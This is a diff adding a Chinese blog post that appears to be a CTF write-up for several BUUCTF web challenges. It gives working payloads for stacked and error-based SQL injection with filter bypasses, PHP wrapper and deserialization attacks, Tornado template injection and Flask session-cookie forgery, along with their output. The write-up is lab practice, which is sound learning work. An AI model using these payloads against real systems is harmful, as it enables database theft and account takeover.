@@ -73,6 +73,145 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-20230614" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/06/14/20230614/" class="article-date">
+  <time class="dt-published" datetime="2023-06-14T11:16:25.000Z" itemprop="datePublished">2023-06-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/buuctf/">buuctf</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/06/14/20230614/">20230614</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="handler-绕过-select-GYCTF2020-Blacklist"><a href="#handler-绕过-select-GYCTF2020-Blacklist" class="headerlink" title="(handler 绕过 select) [GYCTF2020]Blacklist"></a>(handler 绕过 select) [GYCTF2020]Blacklist</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li><p>“handler” 绕过 “select” </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，</span><br><span class="line">该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</span><br><span class="line"></span><br><span class="line">handler [table_name] open;</span><br><span class="line">handler [table_name] read first;</span><br><span class="line">handler [table_name] read next;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol>
+<li><p>SQL注入单引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//正常回显</span><br><span class="line">?inject=1&#x27; and 1=1--+</span><br><span class="line"></span><br><span class="line">//无回显</span><br><span class="line">?inject=1&#x27; and 1=2--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;order by 3--+</span><br><span class="line"></span><br><span class="line">error 1054 : Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>被过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;union select 1,2--+</span><br><span class="line"></span><br><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>“select” 被过滤, 尝试堆叠注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;show databases;--+</span><br><span class="line">?inject=1&#x27;;show tables;--+</span><br></pre></td></tr></table></figure>
+
+<p>回显如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(8) &quot;FlagHere&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>“handler” 绕过 “select” </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;handler FlagHere open;handler FlagHere read first;--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="file-get-contents和include可以读伪协议内容-ZJCTF-2019-NiZhuanSiWei"><a href="#file-get-contents和include可以读伪协议内容-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="(file_get_contents和include可以读伪协议内容) [ZJCTF 2019]NiZhuanSiWei"></a>(file_get_contents和include可以读伪协议内容) [ZJCTF 2019]NiZhuanSiWei</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li><p>file_get_contents可以读伪协议内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents 是 PHP 中的一个函数，它的主要功能是读取文件的内容。</span><br><span class="line">然而，除了可以读取文件外，file_get_contents 还可以读取 URL，甚至可以读取伪协议，比如 &quot;php://input&quot;、&quot;php://output&quot; 和 &quot;data://text/plain;base64,&quot; 等。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>include可以用取伪协议读取文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include($file);</span><br><span class="line"></span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol>
+<li><p>查看源码	</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>绕过第一个点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))</span><br><span class="line"></span><br><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第二个点, 用 $file 读useless.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+
+<p>解密后</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>读取 flag.php, ctrl+u</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><ol>
+<li><p>FUZZ跑一下, 利用updatexml函数进行报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(username,%27~%27,password))from(H4rDsq1)),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>长度限制有限,爆后半段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=123</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><ol>
+<li><p>有的WP说or被过滤了, 且oorr也不行, emmm不知道</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;OORR 1=1--+</span><br><span class="line"> </span><br><span class="line">Hello admin！</span><br><span class="line">Your password is &#x27;f2871cafef4e22217d7895b5a99aa918&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,3 %23</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>正常爆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27; uniunionon selselectect 1,2,database()--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?username=1&amp;password=1&#x27; uniunionon selselectect 1,2,group_concat(table_name) frofromm infoorrmation_schema.tables whewherere table_schema=&#x27;geek&#x27;--+</span><br><span class="line"></span><br><span class="line">//没有, 换库</span><br><span class="line">?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(schema_name)frfromom</span><br><span class="line">(infoorrmation_schema.schemata) %23</span><br><span class="line"></span><br><span class="line">?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere </span><br><span class="line"> table_name=&quot;Flag&quot; %23</span><br><span class="line"> </span><br><span class="line">?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) %23</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><ol>
+<li><p>有三个页面, 分别是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>推测找到 “cookie_secret”</p>
+<p>看WP, tornado是一个python框架, render()是他的一个函数, SSTI</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Tornado templates support control statements and expressions. Control</span><br><span class="line">statements are surrounded by &#123;% %&#125;, e.g. &#123;% if len(items) &gt; 2 %&#125;.</span><br><span class="line">Expressions are surrounded by &#123;&#123; &#125;&#125;, e.g. &#123;&#123; items[0] &#125;&#125;.</span><br><span class="line"></span><br><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后正常md5拼接</p>
+</li>
+</ol>
+<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><ol>
+<li><p>随便注册一个账号登陆, 在 “&#x2F;change” 页面发现源码地址</p>
+</li>
+<li><p>审计发现session的secret_key为 “ckj123”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;.eJw9kMGKwjAURX9leGsXtp0uRnBRqQ0VXkKHtJJsxNHaJDUOVKX1if8-VQZ3Fy4czr132By6-mxgdumu9QQ2dg-zO3z8wAyEzEmRcZrloZZJrFwSoCuJE0bKFYTrygiJkWaZ567tRapIO7wptyORZgbTZEC3t5xxK1hluSwH7rMjssxyl_QYZh59SSiPVqyLm2A4oNxNOTU9d0jcr4xer1qR7q32GCqZD5qVkZLVccyhSBdGyUWrCOfwmMDu3B02l9-2Pr0nII1otowUJT2Xy1iwIkAqPnk46rlv85yon0rUxkoWkXb5TTXzF876bVO_SXL5pav_5rT1YwEBTOB6rrvXZxBM4fEH-HVssw.ZImygA.9CLXvjHa2byoXNarT3zxKXKgjRs&#x27; -s &#x27;ckj123&#x27;</span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;923c8cdb6e09b05253737b431ea937daf690863f32b7381a00127b4cb8eb5516ae0ab6003af2e319b9d28c11747806336baebd87bfc6a21de7a5ea2680aa0dc3&#x27;, &#x27;csrf_token&#x27;: b&#x27;39b8a7c005198d53487aa24a923fae399a47f22b&#x27;, &#x27;image&#x27;: b&#x27;LOYV&#x27;, &#x27;name&#x27;: &#x27;1&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &#x27;ckj123&#x27; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;923c8cdb6e09b05253737b431ea937daf690863f32b7381a00127b4cb8eb5516ae0ab6003af2e319b9d28c11747806336baebd87bfc6a21de7a5ea2680aa0dc3&#x27;, &#x27;csrf_token&#x27;: b&#x27;39b8a7c005198d53487aa24a923fae399a47f22b&#x27;, &#x27;image&#x27;: b&#x27;LOYV&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br><span class="line">.eJw9kMGKwjAURX9leGsX2k4XI7io1IYKL6FDWkk24tjaJDUOVKX1if8-VQZ3Fy4czr132B66-mxgfumu9QS2toL5HT5-YA5CZqTIOM2yQMs4Ui6eoSuIE4bK5YSb0giJoWap567tRaJIO7wptyeRpAaTeEBXWc64Fay0XBYD9-kRWWq5i3sMUo--IJRHKzb5TTAcUO6nnJqeOyTu10Zv1q1IKqs9Bkpmg2ZFqGR5HHMgkqVRctkqwgU8JrA_d4ft5betT-8JSCOarUJFcc_lKhIsnyHlnzwY9dy3eU7UTyVqIyXzULvspprFC2f9rqnfJLn60uV_c9r5sYBd5e0JJnA9193rN5hN4fEHvFpuiw.ZImzWw.oGQHZ-3YXzT2AxLz_giq1sfBO9s</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第二中方法为 unicode 欺骗</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nodeprep.prepare这个方法是将大写字母转换成小写字母，但是它存在一个问题：</span><br><span class="line">它会将unicode编码的ᴬ转化成A</span><br><span class="line"></span><br><span class="line">通过代码审计我们知道login register change处都是使用的strlower()函数，都会使用到nodeprep.prepare函数。</span><br><span class="line">这时我们打理一下思绪，我们只要获得admin用户的登录权限即可，login register change三处都使用了strlower()函数，</span><br><span class="line">也许我们可以通过nodeprep.prepare函数的这一特性来达到更改admin用户的密码，那我们怎么来做？</span><br><span class="line">首先我们可以注册一个ᴬdmin用户，注册成功后其实后端保存的账号为Admin，然后我们在更改密码，因为strlower()可以将大写字母小写化，所以我们更改的是admin的密码</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/06/14/20230614/" data-id="clivscgtx0000uwuzbuvh8x1l" data-title="20230614" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-20230613" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/06/13/20230613/" class="article-date">
@@ -1020,6 +1159,10 @@
       <ul>
         
           <li>
+            <a href="/2023/06/27/20230627/">20230628</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/26/web254-278/">web254-278</a>
           </li>
         
@@ -1033,10 +1176,6 @@
         
           <li>
             <a href="/2023/06/23/20230623/">20230623</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/22/20230622/">20230622</a>
           </li>
         
       </ul>
